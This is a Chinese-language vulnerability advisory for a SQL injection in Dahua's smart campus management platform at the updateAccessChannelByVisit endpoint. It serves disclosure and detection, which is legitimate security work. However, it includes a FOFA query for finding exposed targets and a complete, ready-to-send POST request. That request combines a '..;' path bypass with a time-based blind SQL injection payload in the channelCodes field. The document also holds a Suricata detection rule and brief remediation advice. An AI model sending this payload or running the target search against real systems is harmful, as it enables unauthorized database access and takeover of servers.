# 大华-智慧园区综合管理平台 updateAccessChannelByVisit 存在SQL注入漏洞

大华-智慧园区综合管理平台 updateAccessChannelByVisit 存在SQL注入漏洞，攻击者可执行任意sql命令导致服务器被控。

# 影响版本

大华-智慧园区综合管理平台

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="dahua-智慧园区综合管理平台"

POC/EXP：

```
POST /CardSolution/card/visitor/appointment/..;/..;/..;/card/accessControl/channel/updateAccessChannelByVisit HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip
Connection: keep-alive
Content-Length: 87
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1

{"channelCodes":["1') OR (SELECT 8608 FROM (SELECT(SLEEP(5)))PemD) AND ('RyYI'='RyYI"]}
```

![image-20260821170929651](assets/image-20260821170929651.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"大华智慧园区综合管理平台 - updateAccessChannelByVisit SQL注入 (..; 路径绕过 + SLEEP时间盲注)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri;
        content:"updateAccessChannelByVisit";
        fast_pattern;
    http.uri;
        content:"..;";
        content:"CardSolution"; nocase;
        distance:0;
    http.content_type; content:"application/json";
    http.request_body;
        content:"channelCodes"; nocase;
        content:"SLEEP("; distance:0; nocase;
        content:"SELECT"; distance:0; nocase;
    metadata:
        service http,
        affected_product "大华智慧园区综合管理平台 (CardSolution)",
        vulnerability_type "SQL Injection (MySQL Time-based Blind) / Path Bypass",
        severity "critical";
    classtype:web-application-attack;
    sid:1000728;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
